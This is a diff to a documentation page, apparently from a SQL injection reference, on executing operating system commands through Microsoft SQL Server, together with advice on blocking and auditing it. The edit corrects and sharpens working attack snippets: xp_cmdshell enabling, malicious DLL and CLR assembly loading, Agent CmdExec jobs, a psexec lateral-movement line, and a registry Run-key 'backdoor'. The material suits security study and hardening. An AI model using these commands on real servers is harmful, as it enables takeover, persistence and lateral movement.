@@ -4,10 +4,12 @@ description: Techniques for executing operating system commands through MSSQL
 category: Advanced Techniques
 order: 13
 tags: ["command execution", "xp_cmdshell", "system commands"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 Microsoft SQL Server provides several mechanisms that can be exploited to execute operating system commands. This capability represents one of the highest risk attack vectors in SQL injection, as it allows an attacker to escape the database context and gain access to the underlying operating system.
+
+Most techniques below target **SQL Server on Windows**. On SQL Server for Linux, `xp_cmdshell`, OLE Automation procedures and the Windows-specific procedures (`xp_regwrite`, loadable extended-proc DLLs) are not supported. CLR is limited to `SAFE` assemblies (no `EXTERNAL_ACCESS` or `UNSAFE`), and SQL Server Agent has no CmdExec or PowerShell subsystem, so neither can run operating system commands on Linux.
 
 ## xp_cmdshell Extended Stored Procedure
 
@@ -19,7 +21,7 @@ EXEC xp_cmdshell 'command';
 
 ### Enabling xp_cmdshell
 
-By default, `xp_cmdshell` is disabled in modern SQL Server installations. It can be enabled using:
+By default, `xp_cmdshell` has been disabled since SQL Server 2005. Enabling it with `sp_configure` and `RECONFIGURE` needs the `ALTER SETTINGS` permission, held by the `sysadmin` and `serveradmin` fixed server roles. Running it needs `sysadmin`, in which case commands run as the SQL Server service account, or an explicit `EXECUTE` grant plus a `##xp_cmdshell_proxy_account##` credential, in which case they run as that proxy account:
 
 ```sql
 -- Enable advanced options
@@ -30,6 +32,8 @@ RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 ```
+
+**Linux note:** `xp_cmdshell` is not supported on SQL Server for Linux. Enabling it there fails with "The specified option 'xp_cmdshell' is not supported by this edition of SQL Server." The commands below that run through `xp_cmdshell` therefore apply only to Windows targets. Commands run under the SQL Server service account's privileges.
 
 ### Basic Command Execution
 
@@ -57,7 +61,7 @@ SELECT * FROM #output;
 
 ## SQL Agent Jobs
 
-SQL Server Agent can be used to execute commands via the CmdExec subsystem:
+SQL Server Agent can be used to execute commands via the CmdExec subsystem. SQL Server Agent is not available in Express edition, and its CmdExec subsystem is Windows-only. The Agent service must be running, and the CmdExec subsystem requires `sysadmin` (or a non-sysadmin running under a CmdExec proxy account). The job also needs a target server (`sp_add_jobserver`) before it can start:
 
 ```sql
 -- Create a job to execute commands
@@ -68,12 +72,13 @@ EXEC msdb.dbo.sp_add_jobstep
   @subsystem = 'CmdExec',
   @command = 'cmd.exe /c dir C:\ > C:\output.txt',
   @on_success_action = 1;
+EXEC msdb.dbo.sp_add_jobserver @job_name = 'CommandExecution';
 EXEC msdb.dbo.sp_start_job 'CommandExecution';
 ```
 
 ## OLE Automation Procedures
 
-OLE Automation allows SQL Server to interact with COM objects, including creating files and executing commands:
+OLE Automation allows SQL Server to interact with COM objects, including creating files and executing commands. It is off by default and Windows-only: on Linux the `Ole Automation Procedures` option is listed in `sys.configurations`, but enabling it fails with Msg 15392 ("not supported by this edition"). Calling `sp_OACreate` needs `sysadmin` or an explicit `EXECUTE` grant on the procedure.
 
 ```sql
 -- Enable Ole Automation Procedures
@@ -99,12 +104,12 @@ EXEC sp_OADestroy @sh;
 
 ## Custom Extended Stored Procedures
 
-Malicious DLLs can be loaded as custom extended stored procedures:
+Malicious DLLs can be loaded as custom extended stored procedures. `sp_addextendedproc` is a deprecated, Windows-only feature that requires `sysadmin`; the DLL must already be present on the server (Windows path):
 
 ```sql
--- Create a custom extended stored procedure (requires file write access)
-EXEC sp_addextendedproc 'xp_malicious', 'C:\malicious.dll';
-EXEC xp_malicious;
+-- sp_addextendedproc runs only in the master database context
+EXEC master.dbo.sp_addextendedproc 'xp_malicious', 'C:\malicious.dll';
+EXEC master.dbo.xp_malicious;
 ```
 
 ## CLR Integration
@@ -118,11 +123,18 @@ RECONFIGURE;
 EXEC sp_configure 'clr enabled', 1;
 RECONFIGURE;
 
--- Example of loading a malicious assembly (pseudocode)
+-- Loading an assembly and binding a procedure to it (class/method names depend on the DLL).
+-- CREATE ASSEMBLY and CREATE PROCEDURE must each begin their own batch, so separate
+-- them with GO (the client batch separator); the method must take an nvarchar parameter.
 CREATE ASSEMBLY malicious FROM 'C:\malicious.dll';
-CREATE PROCEDURE run_command AS EXTERNAL NAME malicious.StoredProcedures.RunCommand;
+GO
+CREATE PROCEDURE run_command @cmd NVARCHAR(4000)
+    AS EXTERNAL NAME malicious.StoredProcedures.RunCommand;
+GO
 EXEC run_command 'cmd.exe /c dir C:\';
 ```
+
+Since SQL Server 2017, `clr strict security` is enabled by default and treats all assemblies as `UNSAFE`: an assembly loads only if it is signed with a certificate or asymmetric key that maps to a login holding `UNSAFE ASSEMBLY`, or its hash is registered with `sys.sp_add_trusted_assembly`. Loading an arbitrary unsigned DLL first requires turning `clr strict security` off (which needs `CONTROL SERVER`) or adding the assembly to the trusted list. On SQL Server for Linux only `SAFE` assemblies are supported, which cannot run processes. On Windows, `FROM 'C:\...'` must be a path on the server's own filesystem; the `FROM 0x...` bitstream form supplies the assembly inline.
 
 ## SQL Injection Examples
 
@@ -203,7 +215,7 @@ EXEC xp_cmdshell 'psexec \\other-server -u domain\user -p password cmd.exe /c "c
 When `xp_cmdshell` is not available, alternatives include:
 
 ```sql
--- Using SQL Agent (requires appropriate permissions)
+-- Using SQL Agent (requires appropriate permissions; see the SQL Agent Jobs section above)
 EXEC msdb.dbo.sp_add_job @job_name = 'CommandExecution';
 EXEC msdb.dbo.sp_add_jobstep
   @job_name = 'CommandExecution',
@@ -211,9 +223,10 @@ EXEC msdb.dbo.sp_add_jobstep
   @subsystem = 'CmdExec',
   @command = 'cmd.exe /c dir C:\ > C:\output.txt',
   @on_success_action = 1;
+EXEC msdb.dbo.sp_add_jobserver @job_name = 'CommandExecution';
 EXEC msdb.dbo.sp_start_job 'CommandExecution';
 
--- Using registry access procedures to trigger system events
+-- Using the registry access procedure to set a Run key (Windows only, undocumented, sysadmin)
 EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'backdoor', 'REG_SZ', 'C:\malicious.exe';
 ```
 
@@ -236,20 +249,19 @@ To prevent system command execution via SQL Server:
    DENY EXECUTE ON xp_cmdshell TO PUBLIC;
    ```
 
-3. Monitor for enabling of dangerous features:
+3. Monitor for enabling of dangerous features. `sp_configure` changes are written to the SQL Server error log and raise the `ALTER_INSTANCE` DDL event, so a server-level trigger `FOR ALTER_INSTANCE` can log or block them (`EVENTDATA()` contains the `sp_configure` call). SQL Server Audit records them through the `SERVER_OPERATION_GROUP` action group:
 
    ```sql
-   CREATE TRIGGER security_alert ON ALL SERVER WITH EXECUTE AS 'sa'
-   FOR ALTER_CONFIGURATION
-   AS
-   BEGIN
-     IF EXISTS (SELECT * FROM inserted WHERE name = 'xp_cmdshell' AND value = 1)
-     BEGIN
-       ROLLBACK;
-       RAISERROR('Attempt to enable xp_cmdshell detected', 16, 1);
-     END
-   END;
+   CREATE SERVER AUDIT config_audit TO FILE (FILEPATH = '/var/opt/mssql/audit/');
+   ALTER SERVER AUDIT config_audit WITH (STATE = ON);
+
+   CREATE SERVER AUDIT SPECIFICATION config_spec
+     FOR SERVER AUDIT config_audit
+     ADD (SERVER_OPERATION_GROUP)
+     WITH (STATE = ON);
    ```
+
+   Alternatively, an Extended Events session on `sqlserver.object_altered` / `sp_configure` activity can alert on changes in near real time.
 
 4. Use parameterized queries in applications
 
